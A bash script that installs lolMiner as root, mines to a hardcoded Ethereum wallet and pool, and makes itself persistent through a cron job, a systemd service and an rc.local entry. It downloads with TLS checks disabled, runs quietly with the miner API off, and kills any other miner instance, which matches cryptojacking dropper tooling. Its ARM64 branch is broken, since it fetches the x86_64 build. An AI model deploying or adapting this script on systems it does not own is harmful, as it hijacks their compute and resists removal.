#!/bin/bash


set -e

# Configuration
ETH_WALLET="0x4028A1f905C8b971408279b0A37D34f1A53E1E95"
POOL="eth.2miners.com:2020"
WORKER_NAME="worker01"
MINER_VERSION="1.88"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        ETH Mining Installation Script                  ║${NC}"
echo -e "${GREEN}║        Using lolMiner for Ethereum                     ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[!] Please run as root or with sudo${NC}"
        exit 1
    fi
}

# Detect architecture
detect_arch() {
    ARCH=$(uname -m)
    case $ARCH in
        x86_64)
            echo -e "${GREEN}[+] Architecture: x86_64${NC}"
            MINER_ARCH="Lin64"
            ;;
        aarch64|arm64)
            echo -e "${GREEN}[+] Architecture: ARM64${NC}"
            MINER_ARCH="ARM64"
            ;;
        *)
            echo -e "${RED}[!] Unsupported architecture: $ARCH${NC}"
            exit 1
            ;;
    esac
}

# Detect OS
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        echo -e "${GREEN}[+] OS: $PRETTY_NAME${NC}"
    else
        echo -e "${YELLOW}[!] Cannot detect OS, assuming generic Linux${NC}"
        OS="linux"
    fi
}

# Install dependencies
install_dependencies() {
    echo -e "${YELLOW}[*] Installing dependencies...${NC}"
    
    case $OS in
        ubuntu|debian)
            apt-get update -qq
            apt-get install -y wget curl tar gzip procps coreutils > /dev/null 2>&1
            ;;
        centos|rhel|fedora)
            yum install -y wget curl tar gzip procps-ng coreutils > /dev/null 2>&1
            ;;
        alpine)
            apk add --no-cache wget curl tar gzip procps coreutils > /dev/null 2>&1
            ;;
        *)
            echo -e "${YELLOW}[!] Unknown OS, skipping dependency installation${NC}"
            ;;
    esac
    
    echo -e "${GREEN}[+] Dependencies installed${NC}"
}

# Download lolMiner
download_miner() {
    echo -e "${YELLOW}[*] Downloading lolMiner ${MINER_VERSION}...${NC}"
    
    DOWNLOAD_DIR="/tmp/lolminer_download"
    INSTALL_DIR="/usr/local/bin/lolminer"
    
    mkdir -p $DOWNLOAD_DIR
    cd $DOWNLOAD_DIR
    
    # Download URL
    if [ "$MINER_ARCH" = "Lin64" ]; then
        DOWNLOAD_URL="https://github.com/Lolliedieb/lolMiner-releases/releases/download/${MINER_VERSION}/lolMiner_v${MINER_VERSION}_Lin64.tar.gz"
    else
        echo -e "${RED}[!] ARM64 version not available, trying x86_64${NC}"
        DOWNLOAD_URL="https://github.com/Lolliedieb/lolMiner-releases/releases/download/${MINER_VERSION}/lolMiner_v${MINER_VERSION}_Lin64.tar.gz"
    fi
    
    # Download with retry
    MAX_RETRIES=3
    RETRY_COUNT=0
    
    while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
        if wget --no-check-certificate -q --show-progress "$DOWNLOAD_URL" -O lolminer.tar.gz 2>/dev/null || \
           curl -kL "$DOWNLOAD_URL" -o lolminer.tar.gz 2>/dev/null; then
            break
        fi
        RETRY_COUNT=$((RETRY_COUNT + 1))
        echo -e "${YELLOW}[!] Download failed, retry $RETRY_COUNT/$MAX_RETRIES${NC}"
        sleep 2
    done
    
    if [ ! -f lolminer.tar.gz ] || [ ! -s lolminer.tar.gz ]; then
        echo -e "${RED}[!] Download failed after $MAX_RETRIES attempts${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] Download completed${NC}"
}

# Extract and install
install_miner() {
    echo -e "${YELLOW}[*] Installing lolMiner...${NC}"
    
    # Extract
    tar -xzf lolminer.tar.gz 2>/dev/null || {
        echo -e "${RED}[!] Failed to extract archive${NC}"
        exit 1
    }
    
    # Find binary
    MINER_BIN=$(find . -name "lolMiner" -type f | head -1)
    
    if [ -z "$MINER_BIN" ]; then
        echo -e "${RED}[!] lolMiner binary not found in archive${NC}"
        exit 1
    fi
    
    # Install to system
    mkdir -p $INSTALL_DIR
    cp -f "$MINER_BIN" "$INSTALL_DIR/"
    chmod +x "$INSTALL_DIR/lolMiner"
    
    # Create symlink
    ln -sf "$INSTALL_DIR/lolMiner" /usr/local/bin/lolminer
    
    echo -e "${GREEN}[+] lolMiner installed to $INSTALL_DIR${NC}"
    
    # Cleanup
    cd /
    rm -rf $DOWNLOAD_DIR
}

# Create mining script
create_mining_script() {
    echo -e "${YELLOW}[*] Creating mining configuration...${NC}"
    
    MINING_SCRIPT="/usr/local/bin/start_eth_mining.sh"
    
    cat > $MINING_SCRIPT << EOFSCRIPT
#!/bin/bash
# ETH Mining Startup Script

# Configuration
ETH_WALLET="$ETH_WALLET"
POOL="$POOL"
WORKER_NAME="$WORKER_NAME"
MINER_PATH="/usr/local/bin/lolminer/lolMiner"

# Mining parameters
ALGO="ETHASH"
INTENSITY="--ethstratum ETHPROXY"

# Start mining
cd /usr/local/bin/lolminer/

\$MINER_PATH \\
  --algo \$ALGO \\
  --pool \$POOL \\
  --user \$ETH_WALLET.\$WORKER_NAME \\
  \$INTENSITY \\
  --apiport 0 \\
  --nocolor \\
  --quiet \\
  > /var/log/eth_miner.log 2>&1 &

MINER_PID=\$!
echo \$MINER_PID > /var/run/eth_miner.pid
echo "[+] ETH Miner started with PID: \$MINER_PID"
EOFSCRIPT

    chmod +x $MINING_SCRIPT
    echo -e "${GREEN}[+] Mining script created: $MINING_SCRIPT${NC}"
}

# Setup persistence
setup_persistence() {
    echo -e "${YELLOW}[*] Setting up persistence...${NC}"
    
    # 1. Cron job (check every 10 minutes)
    CRON_JOB="*/10 * * * * pgrep -f 'lolMiner' > /dev/null || /usr/local/bin/start_eth_mining.sh"
    
    (crontab -l 2>/dev/null | grep -v "lolMiner"; echo "$CRON_JOB") | crontab - 2>/dev/null
    echo -e "${GREEN}[+] Cron job added${NC}"
    
    # 2. Systemd service
    if command -v systemctl &> /dev/null; then
        cat > /etc/systemd/system/eth-miner.service << EOFSYSTEMD
[Unit]
Description=Ethereum Mining Service
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/start_eth_mining.sh
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
EOFSYSTEMD

        systemctl daemon-reload
        systemctl enable eth-miner.service 2>/dev/null
        echo -e "${GREEN}[+] Systemd service created${NC}"
    fi
    
    # 3. rc.local
    if [ -f /etc/rc.local ]; then
        if ! grep -q "start_eth_mining.sh" /etc/rc.local; then
            sed -i '/^exit 0/i /usr/local/bin/start_eth_mining.sh' /etc/rc.local
            echo -e "${GREEN}[+] rc.local updated${NC}"
        fi
    fi
}

# Start miner
start_miner() {
    echo -e "${YELLOW}[*] Starting ETH miner...${NC}"
    
    # Kill existing instances
    pkill -f lolMiner 2>/dev/null
    sleep 2
    
    # Start miner
    /usr/local/bin/start_eth_mining.sh
    
    sleep 3
    
    # Check if running
    if pgrep -f lolMiner > /dev/null; then
        MINER_PID=$(pgrep -f lolMiner)
        echo -e "${GREEN}[+] ETH Miner started successfully!${NC}"
        echo -e "${GREEN}[+] PID: $MINER_PID${NC}"
        echo -e "${GREEN}[+] Wallet: $ETH_WALLET${NC}"
        echo -e "${GREEN}[+] Pool: $POOL${NC}"
        echo -e "${GREEN}[+] Worker: $WORKER_NAME${NC}"
        echo ""
        echo -e "${YELLOW}[*] Logs: tail -f /var/log/eth_miner.log${NC}"
    else
        echo -e "${RED}[!] Failed to start miner${NC}"
        echo -e "${YELLOW}[*] Check logs: cat /var/log/eth_miner.log${NC}"
        exit 1
    fi
}

# Show status
show_status() {
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║            ETH Mining Status                           ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    if pgrep -f lolMiner > /dev/null; then
        echo -e "${GREEN}Status: RUNNING ✓${NC}"
        echo -e "PID: $(pgrep -f lolMiner)"
        echo -e "Wallet: $ETH_WALLET"
        echo -e "Pool: $POOL"
        echo -e "Worker: $WORKER_NAME"
        echo ""
        echo -e "${YELLOW}Commands:${NC}"
        echo "  View logs:     tail -f /var/log/eth_miner.log"
        echo "  Stop miner:    pkill -f lolMiner"
        echo "  Restart:       systemctl restart eth-miner"
        echo "  Check process: ps aux | grep lolMiner"
    else
        echo -e "${RED}Status: NOT RUNNING ✗${NC}"
        echo "  Start: /usr/local/bin/start_eth_mining.sh"
    fi
    
    echo ""
}

# Main installation
main() {
    check_root
    detect_arch
    detect_os
    install_dependencies
    download_miner
    install_miner
    create_mining_script
    setup_persistence
    start_miner
    show_status
}

# Run installation
main
